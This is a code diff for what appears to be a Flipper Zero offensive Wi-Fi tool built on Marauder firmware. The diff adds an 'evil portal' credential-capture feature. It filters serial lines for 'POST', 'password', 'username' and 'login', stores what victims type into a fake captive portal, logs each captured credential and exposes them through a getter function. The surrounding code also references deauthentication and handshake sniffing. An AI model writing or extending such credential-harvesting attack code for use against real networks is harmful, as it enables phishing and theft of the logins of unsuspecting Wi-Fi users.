@@ -50,6 +50,9 @@ struct FPwnMarauder {
     FPwnStation stations[FPWN_MAX_STATIONS];
     uint32_t station_count;
 
+    FPwnCapturedCred creds[FPWN_MAX_CREDS];
+    uint32_t cred_count;
+
     FuriMutex* mutex;
 
     uint32_t scan_start_tick; /* furi_get_tick() when the current AP scan started */
@@ -435,6 +438,26 @@ static void fpwn_marauder_rx_cb(const char* line, void* ctx) {
         break;
     }
 
+    case FPwnMarauderStateEvilPortal:
+        /* Capture POST data and credential-bearing lines from the portal.
+         * Marauder outputs lines like "POST data: user=x&pass=y" when a
+         * victim submits the captive portal form. */
+        if(strstr(line, "POST") || strstr(line, "post") || strstr(line, "password") ||
+           strstr(line, "Password") || strstr(line, "username") || strstr(line, "Username") ||
+           strstr(line, "credential") || strstr(line, "login")) {
+            if(m->cred_count < FPWN_MAX_CREDS) {
+                strncpy(m->creds[m->cred_count].data, line, sizeof(m->creds[0].data) - 1);
+                m->creds[m->cred_count].data[sizeof(m->creds[0].data) - 1] = '\0';
+                m->cred_count++;
+                FURI_LOG_I(
+                    TAG,
+                    "Evil portal cred captured [%lu]: %s",
+                    (unsigned long)m->cred_count - 1,
+                    line);
+            }
+        }
+        break;
+
     case FPwnMarauderStateSniffDeauth:
         /* Raw handshake capture — no structured parsing, output goes to log
          * TextBox via the log_callback forwarding below. */
@@ -615,6 +638,8 @@ void fpwn_marauder_evil_portal(FPwnMarauder* m, const char* ssid) {
     fpwn_wifi_uart_send(m->uart, cmd);
 
     furi_mutex_acquire(m->mutex, FuriWaitForever);
+    memset(m->creds, 0, sizeof(m->creds));
+    m->cred_count = 0;
     m->state = FPwnMarauderStateEvilPortal;
     furi_mutex_release(m->mutex);
 
@@ -742,6 +767,15 @@ FPwnStation* fpwn_marauder_get_stations(FPwnMarauder* m, uint32_t* count) {
     *count = m->station_count;
     furi_mutex_release(m->mutex);
     return m->stations;
+}
+
+FPwnCapturedCred* fpwn_marauder_get_creds(FPwnMarauder* m, uint32_t* count) {
+    furi_assert(m);
+    furi_assert(count);
+    furi_mutex_acquire(m->mutex, FuriWaitForever);
+    *count = m->cred_count;
+    furi_mutex_release(m->mutex);
+    return m->creds;
 }
 
 /* Returns the furi_get_tick() value recorded when the last AP scan started.
